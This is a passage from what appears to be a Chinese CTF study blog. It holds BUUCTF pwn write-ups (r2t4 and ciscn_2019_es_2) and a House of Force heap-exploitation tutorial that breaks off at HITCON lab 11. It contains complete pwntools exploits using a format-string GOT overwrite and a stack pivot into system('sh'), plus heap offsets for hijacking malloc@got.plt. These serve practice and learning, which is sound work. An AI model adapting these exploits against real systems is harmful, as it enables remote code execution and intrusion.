class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./r2t4"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26640</span>)</span><br><span class="line">elf=ELF(<span class="string">"./r2t4"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">__stack_chk_fail is 0x601018</span></span><br><span class="line"><span class="string">backdoor is 0x400626</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"__stack_chk_fail is "</span>+hex(__stack_chk_fail)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"backdoor is "</span>+hex(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">"a"</span>+<span class="string">"%"</span>+str(backdoor<span class="number">-1</span>)+<span class="string">"c%8$lln"</span>+p64(__stack_chk_fail)<span class="comment">#  0x30</span></span><br><span class="line">payload+=(<span class="number">0x30</span><span class="number">-8</span>-len(payload))*<span class="string">'a'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,"b main")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后关于 格式化字符串漏洞的学习 大家可以 去i春秋上的 一个 叫教程里(下面的链接)去学习下：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bbs.ichunqiu.com/thread<span class="string">-43624</span><span class="string">-1</span><span class="string">-1</span>.html</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>这道题，感觉还是 增加了不少知识。<br>我们 直接分析 ida伪代码吧！</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome, my friend. What's your name?"</span>);</span><br><span class="line">  vul();                                                   <span class="comment">// 程序内容都是在 vul函数中呢</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">*************************************************************</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]                       // s的偏移是 ebp-0x28</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);                              <span class="comment">//首先 将 s位置开始的 0x20大小的size 的内容都 置为 0</span></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);                                 <span class="comment">//我们可 最多输入 0x30字节数据    </span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);                          <span class="comment">//输出我们的输入的内容</span></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);                                 <span class="comment">//我们可 最多输入 0x30字节数据   </span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);                   <span class="comment">//再 输出我们的输入的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 我们利用的 printf 输出函数 是遇到 “\x00”才会 停止输出的，所以 我们 第一次输入 通过 printf  来 leak 出栈地址。而栈地址之间的偏移 是固定不会变的，我们可计算得到 s所在的栈地址。然后我们在s处构造以下 payload：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s_addr=zhan_addr-(0xff962d44-0xff962c60)               </span><br><span class="line">sh_addr=s_addr+0xc</span><br><span class="line"></span><br><span class="line">pd2=p32(system_plt)+p32(0xdeadbeef)+p32(sh_addr)+<span class="string">"sh\x00\x00"</span>//我们在 s_addr处 写上 我们的 system_plt地址，s_addr+0xc处写入字符串<span class="string">"sh\x00"</span>,将这个地址放在 s_addr+0x8处作为参数</span><br><span class="line">pd2=pd2.ljust(0x28,<span class="string">"a"</span>)</span><br><span class="line">pd2+=p32(s_addr-0x4)                             //这个可以看上面的 [Black Watch 入群题]PWN那题的具体分析，ebp 覆盖为 在rop攻击链所在地址-0x4，ret_addr 覆盖成 leave_ret</span><br><span class="line">pd2+=p32(leave_ret)</span><br></pre></td></tr></table></figure><p>即，在 我们 泄露出的 s所在 地址处  写入 我们的 rop攻击链，然后可根据 (参考上面[Black Watch 入群题]PWN那题  的详细分析) 栈迁移的利用方式，在 ebp 覆盖为 在rop攻击链所在地址-0x4，ret_addr 覆盖成 leave_ret，从而 实现 栈迁移 使得程序 执行流 去执行 到  我们构造的  rop 攻击链，拿到 shell。</p><p>我写出 以下exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#p=process("./ciscn_2019_es_2")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,29391)</span><br><span class="line">elf=ELF(<span class="string">"./ciscn_2019_es_2"</span>)</span><br><span class="line"></span><br><span class="line">system_plt=elf.plt[<span class="string">"system"</span>]</span><br><span class="line">leave_ret=0x08048562</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pd=<span class="string">"a"</span>*(0x28-0x4)                                     <span class="comment">#经gdb调试 我们可 在 偏移 ebp-0x28-4的位置存着的数据 是一个栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">"Welcome, my friend. What's your name?\n"</span>)<span class="comment"># 通过偏移  得到 s_addr </span></span><br><span class="line">p.send(pd)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*(0x28-4))</span><br><span class="line">zhan_addr=u32(p.recv(4))</span><br><span class="line">print <span class="string">"zhan_addr : "</span>+hex(zhan_addr)</span><br><span class="line">s_addr=zhan_addr-(0xff962d44-0xff962c60)</span><br><span class="line">sh_addr=s_addr+0xc</span><br><span class="line"></span><br><span class="line">pd2=p32(system_plt)+p32(0xdeadbeef)+p32(sh_addr)+<span class="string">"sh\x00\x00"</span>//我们在 s_addr处 写上 我们的 system_plt地址，s_addr+0xc处写入字符串<span class="string">"sh\x00"</span>,将这个地址放在 s_addr+0x8处作为参数</span><br><span class="line">pd2=pd2.ljust(0x28,<span class="string">"a"</span>)</span><br><span class="line">pd2+=p32(s_addr-0x4)                             //这个可以看上面的 [Black Watch 入群题]PWN那题的具体分析，ebp 覆盖为 在rop攻击链所在地址-0x4，ret_addr 覆盖成 leave_ret</span><br><span class="line">pd2+=p32(leave_ret)</span><br><span class="line">p.send(pd2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以成功 拿到shell。</p><h1 id="师傅们，今天-你pwn-了嘛！一起来学二进制吧。"><a href="#师傅们，今天-你pwn-了嘛！一起来学二进制吧。" class="headerlink" title="师傅们，今天 你pwn 了嘛！一起来学二进制吧。"></a>师傅们，今天 你pwn 了嘛！一起来学二进制吧。</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;小题。。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="PWN" scheme="http://yoursite.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>House Of Force</title>
    <link href="http://yoursite.com/2020/04/29/House%20Of%20Force/"/>
    <id>http://yoursite.com/2020/04/29/House Of Force/</id>
    <published>2020-04-29T15:46:37.000Z</published>
    <updated>2020-04-29T17:46:49.872Z</updated>
    
    <content type="html"><![CDATA[<p>House Of Force.我太弱了。</p><a id="more"></a><h1 id="漏洞关键代码："><a href="#漏洞关键代码：" class="headerlink" title="漏洞关键代码："></a>漏洞关键代码：</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;          <span class="comment">//av代表arena, 这是获取当前的 top chunk </span></span><br><span class="line"><span class="built_in">size</span>  = chunksize(victim); <span class="comment">//获得当前 top chunk 的 size</span></span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;                          <span class="comment">//nb 代表用户申请的chunk 的size(经对齐处理后的)</span></span><br><span class="line">    remainder_size = <span class="built_in">size</span> - nb;<span class="comment">//剩余 top chunk的 size</span></span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);<span class="comment">//见本代码的最后一行 的define</span></span><br><span class="line">                                       即 top chunk和要分配出去的chunk的<span class="built_in">size</span>，</span><br><span class="line">                                         通过偏移的方式找到新的top chunk的位置。</span><br><span class="line">    av-&gt;top        = remainder;   <span class="comment">//于是 上面得到的地址  就成为 新的 top chunk的地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面 是对 新的  top chunk的chunk_head 做的处理</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">   </span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><h1 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h1><p>我们就看下 正常情况下的 分割 top chunk 的变化吧：<br>查看top chunk addr：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd1b78</span> <span class="string">&lt;main_arena+88&gt;:</span><span class="number">0x0000000000602020</span></span><br><span class="line"><span class="string">x/gx</span> <span class="number">0x7ffff7dd1b78</span>   <span class="string">//这里的</span>  <span class="number">0x7ffff7dd1b78</span> <span class="string">并不是固定的</span></span><br></pre></td></tr></table></figure><p>或者 直接 p main_arena    也是可以的</p><p>看这个例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *ptr1,*ptr2;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);             <span class="comment">//执行完 这里 设为 A 处</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);             <span class="comment">//执行完 这里 设为 B 处</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -g force.c -o force</span></span><br></pre></td></tr></table></figure><p>执行完 这里 设为 A 处</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">heap</span></span><br><span class="line"><span class="number">0x602000</span> <span class="string">FASTBIN</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">33</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x20fe1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x602020</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span>      <span class="string">//top</span> <span class="string">chunk's</span>  <span class="string">addr</span> <span class="string">is</span> <span class="number">0x602020</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">135137</span><span class="string">,</span>            <span class="string">//top</span> <span class="string">chunk's</span>  <span class="string">size</span> <span class="string">is</span> <span class="number">0x20fe1</span></span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>执行完 这里 设为 B 处<br>按最上面代码中的分析  可 推测  执行完 B 后</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new top chunk's  addr is <span class="number">0x602040</span> 即<span class="number">0x602020</span> + （<span class="number">0x10</span>+<span class="number">0x10</span>）  括号里 是经对齐</span><br><span class="line"> 后的  用户申请的chunk 大小。</span><br><span class="line">new top chunk's  size is <span class="number">0x20fc1</span>   即<span class="number">0x20fe1</span> - （<span class="number">0x10</span>+<span class="number">0x10</span>）</span><br></pre></td></tr></table></figure><p>验证  推测正确</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">heap</span></span><br><span class="line"><span class="number">0x602000</span> <span class="string">FASTBIN</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">33</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x21</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x602020</span> <span class="string">FASTBIN</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">33</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x20fc1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x602040</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span>    <span class="string">//new</span> <span class="string">top</span> <span class="string">chunk's</span>  <span class="string">addr</span> <span class="string">is</span> <span class="number">0x602040</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">135105</span><span class="string">,</span>        <span class="string">//top</span> <span class="string">chunk's</span>  <span class="string">size</span> <span class="string">is</span> <span class="number">0x20fe1</span>          <span class="string">即</span>  <span class="number">135105</span></span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>看下面例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">long</span> *)(((<span class="keyword">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -g force.c -o force</span></span><br></pre></td></tr></table></figure><p>目标是通过HOF来篡改   <a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a>   实现劫持程序流程   即 修改 <a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a> 指向的  地址    ：比如为  system_addr</p><ol><li><a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a>    is         [0x601020]   <a href="mailto:malloc@GLIBC_2.2.5" target="_blank" rel="noopener">malloc@GLIBC_2.2.5</a> -&gt; 0x7ffff7a91130 (malloc)</li><li>为了 绕过  top chunk size &gt; nb + MINSIZE     将   top chunk size   设置  为 -1            即0xffffffff ffffffff</li><li>我们的 目的 首先是   申请到   含有 <a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a> 的地址 的chunk。 注意  申请成功后   返回的  时 申请到的 chunk_mem_addr    所以 我们 要申请的chunk的 addr 应该是 0x601020 -0x10 即   0x601010 </li><li>而 malloc 时   申请 的  chunk的addr  =       top chunk addr + nb的 size</li><li>我们就 看这个<br>top chunk addr ： 0x0000000000 602020  //用 x/10gx 0x7ffff7dd1b20 查看   &lt;main_arena+88&gt;对应的内容<br><a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a> ： 0x0000000000 601020 </li></ol><p>由 黄色公式 可知   top chunk + nb的 size应该 为：  要申请的chunk的addr 0x601010 - top chunk addr 0x602020  = -0x1010  即 -4112    </p><p>这里的话 其实还有个  size 检测  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>wiki.x10sec.org<span class="regexp">/pwn/</span>heap<span class="regexp">/house_of_force/</span><span class="comment">#_7</span></span><br></pre></td></tr></table></figure><p>这里 就记住   一般   再减  size_sz 就是 了   -4120</p><p>于是</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new top chunk's  addr is <span class="number">0x602040</span> 即<span class="number">0x602020</span> + （ <span class="number">-4120</span>+<span class="number">0x10</span>） ='<span class="number">0x601018</span>'   但却是 <span class="number">0x601010</span> （ 括号里 是经对齐 后的  用户申请的chunk 大小。）</span><br><span class="line">new top chunk's  size is <span class="number">0x20fc1</span>   即<span class="number">0x7fffffff</span> fffffff - （<span class="number">-4120</span> +<span class="number">0x10</span>）  =<span class="number">0x800000000001007</span> 但却是 <span class="number">0xffffffffffffeff1</span></span><br></pre></td></tr></table></figure><p>p main_arena<br><br><img src="https://s1.ax1x.com/2020/04/30/JHD2aF.png" alt="JHD2aF.png"></p><p>即 实现了  通过控制 top  chuk的size   控制malloc 的参数 去使得top chunk 的addr 指向  memaddr 是 malloc_got addr 的 chunk</p><p>上面是  将 top chunk addr 小 到  <a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a> -0x10   了</p><p>我们再来转到  __malloc_hook  -0x10  处                   </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//进程的__malloc_hook地址一定为<span class="number">0x7ffff7dd1b10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">malloc</span>  (参数)   参数  ：   (target_addr<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>) - top  chunk addr <span class="number">-0</span><span class="keyword">x</span><span class="number">10</span></span><br><span class="line"></span><br><span class="line">虽然  有些 没太明白，但 大概可以这一暂时先记着</span><br><span class="line">如果 要将top chunk addr变小 到 目标地址<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>      <span class="keyword">malloc</span> 参数 要是 负数         [ (target_addr<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>)-top chunk addr ] - <span class="number">0x10</span> +<span class="number">8</span></span><br><span class="line">如果 要将top chunk addr变大 到 目标地址<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>      <span class="keyword">malloc</span> 参数 要是 正数数      [ (target_addr<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>)-top chunk addr ] - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><hr><p>经过 初步的调试，发现 我们malloc 的参数 size    ：     new top chunk - old top chunk -0x10           就可以的！</p><h1 id="HITCON-training-lab-11"><a href="#HITCON-training-lab-11" class="headerlink" title="HITCON training lab 11"></a>HITCON training lab 11</h1><p>我们看下这个  很经典的 一题！<br>里面 有个 magic 函数 ，可以把同级目录下的 flag 文件中的内容 打印出来！</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">magic</span><span class="params">()</span>               <span class="comment">//0x400D49</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"./flag"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外在主函数 中我们可以看到 以下代码，因为我看了 源代码 可以很清楚的知道 这是个  含有两个函数指针的结构体!<br>我在看 时钟师傅的   博客时   发现  结构体（不仅这个）在他的ida 中都能 很好的 翻译的来！  而我的 仍然是 通过  数组及 偏移 呈现呢 !回头请教下！</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v3</span> = malloc(<span class="number">0</span>x10uLL)<span class="comment">;</span></span><br><span class="line">  *v3 = hello_message<span class="comment">;</span></span><br><span class="line">  v3[<span class="number">1</span>] = goodbye_message<span class="comment">;                      // struct box &#123;</span></span><br><span class="line">                                                //   void (*hello_message)()<span class="comment">;</span></span><br><span class="line">                                                //   void (*goodbye_message)()<span class="comment">;</span></span><br><span class="line">                                                // &#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>在程序 开始的 是由 执行了 这么一个  指令，要是  不通过在 跑一下程序  我都差点忽略它。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((<span class="name">void</span> (<span class="name">__fastcall</span> *)(signed __int64, _QWORD))*v3)(<span class="number">16</span>LL, <span class="number">0</span>LL)<span class="comment">;   这个 其实 是 call goodbye_message指针</span></span><br><span class="line">对应 